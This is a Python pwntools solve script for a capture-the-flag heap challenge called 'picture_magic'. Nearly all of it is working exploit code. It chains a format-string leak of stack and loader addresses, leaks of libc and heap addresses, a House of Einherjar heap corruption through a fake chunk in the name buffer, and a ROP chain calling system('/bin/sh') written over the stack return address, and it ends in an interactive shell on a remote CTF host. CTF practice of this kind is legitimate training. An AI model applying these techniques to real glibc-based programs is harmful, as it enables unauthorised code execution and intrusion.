#!/usr/bin/env python3
from pwn import *
# =========================================================
#                          SETUP
# =========================================================
exe = './picture_magic'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
ld = ELF("./ld-2.36.so")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def create(width, height, data=None):
    io.sendlineafter(b"-> ", b"1")
    io.sendlineafter(b"Width: ", str(width).encode())
    io.sendlineafter(b"Height: ", str(height).encode())
    if data:
        io.sendafter(b"================================\n", data)

def transform(idx, size, row, col, op):
    io.sendlineafter(b"-> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", op)
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", str(row).encode())
    io.sendlineafter(b": ", str(col).encode())

def show(idx):
    io.sendlineafter(b"-> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())

def sell(idx, price=0, throw="y"):
    io.sendlineafter(b"-> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b"? ", str(price).encode())
    if price:
        io.recvuntil(b"$")
        leak = io.recvline().strip()
        io.sendlineafter(b"(y/N) ", str(throw).encode())
        return leak

def change(name):
    io.sendlineafter(b"-> ", b"5")
    io.sendlineafter(b": ", name)

def write_byte(b: int, index: int, column: int):
    transform(index, 0, 0, column, b'mul')
    transform(index, abs(b - 0x20), 0, column, b'add' if b > 0x20 else b'sub')

def write_qword(qword: bytes, offset: int, index: int):
    for i, b in enumerate(qword):
        if b:
            write_byte(b, index, offset - (8 - i))

two_c = lambda n: ((~(abs(n)) + 1) & 0xffffffffffffffff)

def exploit():
    # 7rocky's solve script & write up https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/
    global io
    io = initialize()
    with log.progress("Leak stack & ld via fmstr"), context.silent:
        io.sendlineafter(b": ", b"asdf")
        create(0, 0)
        create(0, 0)
        create(0, 0)
        create(0, 0)

        stack = int(sell(0, "%p", "N").split(b".")[0], 16)
        ld_leak = int(b"0x" + sell(0, "%a").split(b".")[1].split(b"p")[0] + b"0", 16)
        ld.address = ld_leak - ld.sym["_rtld_global"]
        name_addr = stack + 0x2160
    log.info("Stack: %#x", stack)
    log.info("Name address: %#x", name_addr)
    log.info("LD Leak: %#x", ld_leak)
    log.info("LD Base: %#x", ld.address)

    with log.progress("Leak libc via create"), context.silent:
        sell(2) #Unsorted bins
        sell(3) #Wilderness
        create("a", "a")
        io.recvuntil(b'Chosen size of (')
        width, height = io.recvuntil(b')', drop=True).decode().split(", ")
        libc_leak = ((int(height) << 32) | int(width))
        libc.address = libc_leak - (libc.sym["main_arena"] + 96)
    log.info("Libc Leak: %#x", libc_leak)
    log.info("Libc Base: %#x", libc.address)

    with log.progress("Leak heap via create"), context.silent:
        create(0, 0)
        create("a", "a")
        io.recvuntil(b'Chosen size of (')
        width, height = io.recvuntil(b')', drop=True).decode().split(", ")
        heap = ((int(height) << 32) | int(width)) & ~0xFFF
        sell(0) # For reuse future attack
    log.info("Heap base: %#x", heap)

    with log.progress("House of Einherjar"), context.silent:
        create(0x4f0, 1, b"\n")
        prev_size = two_c(heap + 0x790 - name_addr)
        write_qword(p64(prev_size), 0x4f0, 0)
        change(p64(0) + p64(prev_size) + p64(name_addr) * 4)
        sell(1)
        change(p64(0) + p64(0x20371)) #Use the topchunk of the previous to make sure not crash
    log.info("Prev Size: %#x", prev_size)

    with log.progress("Get shell with libc ret2system via overwriting the stack ret"), context.silent:
        create(0, 0) #Target chunk
        change(p64(0) + p64(0x501) + p32(0xffffffff) + p32(1)) #Make fake picture chunk
        rop = ROP(libc)
        rop.raw(rop.ret.address)
        rop.system(next(libc.search(b'/bin/sh')))
        payload = rop.chain()
        for i in range(0, len(payload), 8):
            write_qword(payload[i:i+8], 56+i, 1)
        io.sendlineafter(b"-> ", b"6")
    io.interactive()

if __name__ == '__main__':
    exploit()
